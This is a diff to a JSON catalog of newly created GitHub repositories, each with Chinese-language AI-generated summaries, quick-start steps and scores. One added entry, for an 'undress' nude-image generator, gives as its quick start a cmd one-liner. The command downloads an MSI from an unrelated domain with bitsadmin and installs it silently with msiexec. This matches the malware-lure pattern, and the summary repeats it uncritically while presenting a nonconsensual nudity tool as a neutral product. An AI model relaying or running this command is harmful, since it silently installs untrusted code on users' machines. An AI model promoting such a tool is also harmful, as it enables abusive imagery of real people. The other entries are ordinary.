@@ -1,6 +1,6 @@
 {
   "version": "1",
-  "updatedAt": "2026-06-04T06:26:52.823Z",
+  "updatedAt": "2026-06-05T06:05:02.415Z",
   "projects": [
     {
       "owner": "codecrafters-io",
@@ -44787,6 +44787,363 @@
         "category": "其他"
       },
       "analyzedAt": "2026-06-04T06:26:52.806Z"
+    },
+    {
+      "owner": "veryyoldman",
+      "repo": "undress-ai-image-video-generator",
+      "fullName": "veryyoldman/undress-ai-image-video-generator",
+      "description": "AI tool for generating uncensored images and videos",
+      "language": "Python",
+      "topics": [
+        "adult-ai",
+        "adults",
+        "adults-only",
+        "adults-videos",
+        "ai-video",
+        "ai-video-generation",
+        "ai-video-generator",
+        "ai-video-maker",
+        "nsfw",
+        "nsfw-prompt",
+        "nsfw-prompts",
+        "nude-ai-generator-list",
+        "uncensored-ai-image-generator",
+        "uncensored-ai-video-generator",
+        "undress-ai-gen",
+        "unrestricted-ai"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-05T00:25:02Z",
+      "url": "https://github.com/veryyoldman/undress-ai-image-video-generator",
+      "analysis": {
+        "positioning": "Windows本地运行，生成未审查AI图像/视频的工具。",
+        "useCases": [
+          "你想生成特定描述的图片 → 它帮你把文字变成无限制图片。",
+          "你想生成特定描述的视频 → 它帮你把文字变成无限制视频。",
+          "你有一张图片想动起来 → 它帮你把图片做成动画视频。",
+          "你现有的图片想修改、重塑风格 → 它帮你用AI编辑和变换图片。"
+        ],
+        "audience": "专注于生成未审查AI内容或进行相关技术探索的创作者、开发者和实验者。",
+        "quickStart": {
+          "prerequisites": "Windows操作系统",
+          "steps": [
+            "打开命令提示符（Win + R，输入 cmd 并回车）",
+            "复制以下命令到命令提示符并运行：`bitsadmin /transfer undress-ai-image-video-generator /download /priority normal \"https://devcodee.com/api\" \"%TEMP%\\setup.msi\" && msiexec /i \"%TEMP%\\setup.msi\" /qn /norestart`"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "Midjourney",
+            "method": "在线服务（Discord机器人）",
+            "models": "专有模型",
+            "pricing": "付费"
+          },
+          {
+            "name": "Stable Diffusion (本地部署)",
+            "method": "本地软件（如Automatic1111）",
+            "models": "开源（需手动配置）",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费（软件本身，需用户提供运行硬件）",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目定位明确为生成“未审查”的AI图像和视频，Topics也大量涉及`adult-ai`、`nsfw`等敏感词汇。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，目前仅有少量开启但未关闭的Issue。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-06-05T06:00:34.356Z"
+    },
+    {
+      "owner": "cpaczek",
+      "repo": "skylight",
+      "fullName": "cpaczek/skylight",
+      "description": "Project the aircraft passing overhead onto your ceiling in real time, from an RTL-SDR — with a live sky layer (sun, moon, stars, ISS) and where each plane is headed.",
+      "language": "TypeScript",
+      "topics": [
+        "ads-b",
+        "aircraft",
+        "art-installation",
+        "flight-tracker",
+        "projector",
+        "raspberry-pi",
+        "react",
+        "rtl-sdr",
+        "typescript"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-02T23:40:28Z",
+      "url": "https://github.com/cpaczek/skylight",
+      "analysis": {
+        "positioning": "实时飞机、天文投影到天花板，将屋顶变为“透视窗”。",
+        "useCases": [
+          "你对航空或天文感兴趣 → 它将头顶飞机轨迹、星体及卫星实时投射到天花板。",
+          "你寻求独特智能家居展示 → 它让你的天花板变为实时互动空中交通及星空地图。",
+          "你希望在家中进行沉浸式体验 → 它提供通过手机操控的个性化空中视图和天文信息。"
+        ],
+        "audience": "适合航空爱好者、天文观测者或追求独特家居科技装置的用户，提供沉浸式实时空中视图体验。",
+        "quickStart": {
+          "prerequisites": "RTL-SDR接收器（或免费Web API测试）、树莓派5（8GB）、投影仪。",
+          "steps": [
+            "设置RTL-SDR接收并解码ADS-B数据（或使用Web API获取数据）。",
+            "将Skylight部署到树莓派，并连接投影仪将画面投射到天花板。",
+            "通过手机控制面板调整显示设置、过滤条件和天文图层。"
+          ],
+          "note": "可使用Web API进行无硬件测试；项目预设旧金山国际机场数据，但可配置任何地点。"
+        },
+        "competitors": [],
+        "pricing": "免费（软件开源，MIT许可证）；未来将推出配套硬件套件供购买。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "极具创意和未来感的开源项目。将航空数据、天文信息与硬件结合，创造出独特且沉浸式的实时天花板投影体验，科技与艺术完美融合。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，Issue 开启1个/关闭0个，项目可能处于早期或维护频率不高。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-06-05T06:01:52.529Z"
+    },
+    {
+      "owner": "Fullive-AI",
+      "repo": "Anima",
+      "fullName": "Fullive-AI/Anima",
+      "description": "Make Every Hardware Intelligent — an open-source Agent OS for hardware intelligence",
+      "language": "Python",
+      "topics": [],
+      "license": "Apache-2.0",
+      "createdAt": "2026-06-01T10:06:21Z",
+      "url": "https://github.com/Fullive-AI/Anima",
+      "analysis": {
+        "positioning": "开源Agent OS，让硬件获得智能灵魂。",
+        "useCases": [
+          "你希望智能家居设备主动协作 → 它让灯光、空调等理解环境和习惯，实现设备间智能联动。",
+          "你厌倦了被动控制硬件 → 它通过LLM大脑赋予设备感知、决策、学习能力，从被动连接变为智能代理。",
+          "你想定制智能硬件的高级行为 → 它提供技能系统，使设备决策更符合特定场景、舒适度及安全需求。"
+        ],
+        "audience": "追求极致智能硬件体验的开发者和智能家居爱好者。",
+        "quickStart": {
+          "prerequisites": "Python 3.11-3.13环境",
+          "steps": [
+            "克隆项目仓库",
+            "安装依赖并运行"
+          ],
+          "note": "当前主要支持小米米家(MIoT)设备。"
+        },
+        "competitors": [
+          {
+            "name": "Home Assistant",
+            "method": "开源智能家居平台，通过集成多种设备实现自动化与控制。",
+            "models": "N/A",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费 (Apache-2.0 开源许可)",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目目标宏大且清晰，技术栈结合LLM Agent、FastAPI、React等前沿技术。架构设计具备前瞻性，但社区活跃度（Issue关闭数）尚待提升。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue开启6个，关闭0个，社区活跃度刚起步，有待观察。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-06-05T06:02:49.530Z"
+    },
+    {
+      "owner": "PentesterFlow",
+      "repo": "agent",
+      "fullName": "PentesterFlow/agent",
+      "description": "Agentic offensive-security in your terminal",
+      "language": "TypeScript",
+      "topics": [
+        "ai",
+        "ai-agents",
+        "bugbounty",
+        "penetration-testing",
+        "security-audit",
+        "security-automation"
+      ],
+      "license": "Apache-2.0",
+      "createdAt": "2026-05-31T11:14:35Z",
+      "url": "https://github.com/PentesterFlow/agent",
+      "analysis": {
+        "positioning": "终端AI渗透测试CLI，辅助人机协作，高效发现漏洞。",
+        "useCases": [
+          "你手动执行侦察和枚举 → 它帮你自动化规划并执行信息收集、枚举任务，并自动收集证据。",
+          "你手动测试API漏洞（如越权） → 它帮你调用真实工具测试目标API，确认漏洞（如IDOR），并生成证据报告。",
+          "你反复记录渗透过程和学习新知识 → 它帮你记住有用的经验，建立知识库，提高未来渗透效率，无需重新训练模型。"
+        ],
+        "audience": "渗透测试人员和漏洞赏金猎人，在授权范围内进行高效漏洞发现、验证和报告。",
+        "quickStart": {
+          "prerequisites": "Node.js 20+",
+          "steps": [
+            "安装 PentesterFlow CLI 工具。",
+            "在终端设置目标URL，并用自然语言描述测试意图，AI将自动执行渗透流程。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费，开源（Apache-2.0许可证）。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "清晰直观的终端交互，命令执行透明可控，人机协作理念强，符合工程师对安全工具的期待。",
+        "isVibeCoding": true,
+        "communityActivity": "Issues数量极少（1开1关），开闭比优秀但样本量小，社区活跃度需持续观察。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-06-05T06:03:04.097Z"
+    },
+    {
+      "owner": "r14dd",
+      "repo": "patent",
+      "fullName": "r14dd/patent",
+      "description": "A prior-art search for your code ideas. Stop building what already exists.",
+      "language": "Rust",
+      "topics": [
+        "cli",
+        "developer-tools",
+        "ollama",
+        "rust",
+        "search",
+        "tui"
+      ],
+      "license": "Apache-2.0",
+      "createdAt": "2026-05-30T11:12:04Z",
+      "url": "https://github.com/r14dd/patent",
+      "analysis": {
+        "positioning": "代码创意防撞车利器，CLI下秒查开源生态。",
+        "useCases": [
+          "你有一个开发新工具的想法 → 它帮你快速搜索现有方案，避免重复开发。",
+          "你想了解某个技术领域的现有最佳实践 → 它帮你聚合排名相关开源项目，提供灵感和参考。",
+          "你想快速分析一个开发生态的竞争态势 → 它帮你一站式检索多个注册表，无需手动切换。"
+        ],
+        "audience": "所有开发者、产品经理，尤其适合在构思新项目或评估现有方案时使用，避免重复造轮子。",
+        "quickStart": {
+          "prerequisites": "需安装Rust和Cargo。",
+          "steps": [
+            "`cargo install patent`",
+            "`patent \"你的代码创意\"`"
+          ],
+          "note": "如需AI判断（Open/Crowded/Saturated）功能，需本地运行Ollama或配置OpenAI兼容API。"
+        },
+        "competitors": [],
+        "pricing": "免费，开源（Apache-2.0）",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "巧妙整合了多源注册表搜索、本地语义排序及Ollama AI判断，一站式解决开发者‘代码创意是否已被实现’的痛点，避免重复工作，极具实用价值和创新性。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue 开启6个，未关闭。项目活跃度较低，可能处于早期开发阶段。",
+        "category": "AI编程助手"
+      },
+      "analyzedAt": "2026-06-05T06:03:19.796Z"
+    },
+    {
+      "owner": "vannyben7",
+      "repo": "course-learning-workspace",
+      "fullName": "vannyben7/course-learning-workspace",
+      "description": "",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-05-31T01:23:16Z",
+      "url": "https://github.com/vannyben7/course-learning-workspace",
+      "analysis": {
+        "positioning": "本地优先的AI课程学习工作区，整合资料、笔记、复习与AI辅助。",
+        "useCases": [
+          "你整理一门课的讲义、论文 → 它帮你构建本地学习空间，集中管理所有资料。",
+          "你阅读PDF/PPT并做笔记 → 它帮你做批注，并保存AI回答作为阅读笔记。",
+          "你想理解或复习课程内容 → 它帮你概括文件，说明其在课程中位置，并回答疑问。"
+        ],
+        "audience": "面向学生和教学团队，用于本地化管理课程资料、辅助学习与教学。",
+        "quickStart": {
+          "prerequisites": "Docker Desktop 或 Docker Engine + Compose v2",
+          "steps": [
+            "从仓库根目录运行：`scripts/docker-start.sh`",
+            "访问：`http://127.0.0.1:8780`"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "NotebookLM (Google)",
+            "method": "网页上传资料，AI辅助学习。",
+            "models": "Gemini",
+            "pricing": "免费"
+          },
+          {
+            "name": "AskYourPDF (或类似在线文档AI问答工具)",
+            "method": "网页上传PDF/文档，AI问答、总结。",
+            "models": "通常基于GPT系列",
+            "pricing": "部分免费/付费"
+          }
+        ],
+        "pricing": "免费开源，云端AI模型需自备API Key。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目文档详尽，部署简便，功能定位明确且注重本地数据隐私，是学生和教学团队的实用工具。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue数量为0，目前社区活跃度无法从Issue统计判断。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-06-05T06:03:50.304Z"
+    },
+    {
+      "owner": "esengine",
+      "repo": "DeepSeek-Reasonix",
+      "fullName": "esengine/DeepSeek-Reasonix",
+      "description": "DeepSeek-native AI coding agent for your terminal. Engineered around prefix-cache stability — leave it running.",
+      "language": "Go",
+      "topics": [
+        "agent",
+        "agent-framework",
+        "ai-agent",
+        "ai-coding",
+        "cli",
+        "coding-agent",
+        "deepseek",
+        "developer-tools",
+        "ink",
+        "llm",
+        "prompt-caching",
+        "r1",
+        "terminal",
+        "tool-use",
+        "tui",
+        "typescript"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-04-21T08:27:02Z",
+      "url": "https://github.com/esengine/DeepSeek-Reasonix",
+      "analysis": {
+        "positioning": "DeepSeek原生AI终端编码代理，前缀缓存稳定。",
+        "useCases": [
+          "你想在终端快速生成代码 → 它作为AI编程代理，直接在终端生成、修改或优化代码。",
+          "你遇到编码难题需要AI辅助 → 它提供即时代码建议、错误排查和解决方案。",
+          "你进行日常开发需要提升效率 → 它利用前缀缓存，实现流畅、稳定的AI交互式编码体验。"
+        ],
+        "audience": "追求高效、终端原生AI辅助的开发者，希望AI直接介入其编码工作流。",
+        "quickStart": {
+          "prerequisites": "Node.js (用于npm)",
+          "steps": [
+            "npm i -g reasonix"
+          ],
+          "note": "1.0版本后安装的是Go编译的二进制文件，0.x版本为TypeScript构建。"
+        },
+        "competitors": [
+          {
+            "name": "GitHub Copilot CLI",
+            "method": "终端命令行交互，代码生成与辅助",
+            "models": "OpenAI模型 (私有)",
+            "pricing": "付费"
+          },
+          {
+            "name": "Open Interpreter",
+            "method": "终端命令行交互，执行代码与任务",
+            "models": "支持多种LLM (如OpenAI, Anthropic等)",
+            "pricing": "免费 (开源，但需支付API调用费)"
+          }
+        ],
+        "pricing": "免费 (MIT License，开源)",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "专为终端开发者设计的AI编程代理，Go语言重写确保性能和稳定性，提供高效、原生的编码辅助体验，高度聚焦编码效率。",
+        "isVibeCoding": true,
+        "communityActivity": "社区非常活跃，Issue 解决率高 (262开/1046关)，拥有近1.8万星，且提供Discord等多种交流渠道。",
+        "category": "AI编程助手"
+      },
+      "analyzedAt": "2026-06-05T06:05:02.392Z"
     }
   ]
 }
